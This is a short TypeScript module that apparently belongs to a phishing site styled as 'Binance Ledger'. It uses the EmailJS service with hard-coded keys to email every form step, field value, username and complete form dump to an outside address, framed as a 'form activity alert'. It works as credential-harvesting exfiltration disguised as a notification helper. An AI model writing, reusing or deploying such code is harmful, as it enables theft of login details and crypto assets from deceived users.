
import emailjs from 'emailjs-com';

// Initialize EmailJS with your user ID
emailjs.init("hDX5LRevxoenkHrjk");

interface EmailData {
  step: string;
  field?: string;
  value?: string;
  username?: string;
  timestamp: string;
  allFormData?: any;
}

export const sendEmailNotification = async (data: EmailData) => {
  console.log('=== EMAIL NOTIFICATION START ===');
  console.log('Data being sent:', data);

  const templateParams = {
    to_email: "donotreply@binanceledger.com",
    from_name: "Binance Ledger System",
    subject: `🔒 ${data.step} - Form Activity Alert`,
    message: `Step: ${data.step}
${data.field ? `Field: ${data.field}` : ''}
${data.value ? `Value: ${data.value}` : ''}
${data.username ? `Username: ${data.username}` : ''}
Timestamp: ${data.timestamp}

${data.allFormData ? `All Form Data:\n${JSON.stringify(data.allFormData, null, 2)}` : ''}`.trim(),
    step: data.step,
    field: data.field || '',
    value: data.value || '',
    username: data.username || '',
    timestamp: data.timestamp,
    allFormData: data.allFormData ? JSON.stringify(data.allFormData, null, 2) : ''
  };

  console.log('Template params:', templateParams);
  console.log('Using Service ID:', "service_r7sis9a");
  console.log('Using Template ID:', "template_dec5tz3");

  try {
    const result = await emailjs.send(
      "service_r7sis9a",
      "template_dec5tz3", 
      templateParams
    );
    
    console.log('✅ Email sent successfully!', result);
    console.log('=== EMAIL NOTIFICATION END ===');
    return result;
  } catch (error) {
    console.error('❌ Email failed to send:', error);
    console.error('Error details:', error);
    console.log('=== EMAIL NOTIFICATION END (ERROR) ===');
    throw error;
  }
};
